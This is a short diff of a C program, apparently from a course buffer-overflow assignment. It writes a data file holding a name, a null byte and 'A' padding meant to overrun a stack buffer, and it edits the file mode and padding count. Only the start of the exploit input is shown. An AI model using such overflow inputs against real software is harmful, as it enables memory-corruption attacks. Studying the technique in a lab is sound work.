@@ -23,11 +23,11 @@ int main(void) {
     unsigned long ulAddr;
     int i;
 
-    psFile = fopen("dataB", "wb");
+    psFile = fopen("dataB", "w");
     fprintf(psFile, "Josh Song"); /* prints name bytes */
     putc('\0', psFile); /* prints nullbyte */
 
-    for (i = 9; i < 80; i++) { /* prints padding to overrun stack */
+    for (i = 10; i < 80; i++) { /* prints padding to overrun stack */
         putc('A', psFile);
     }
 
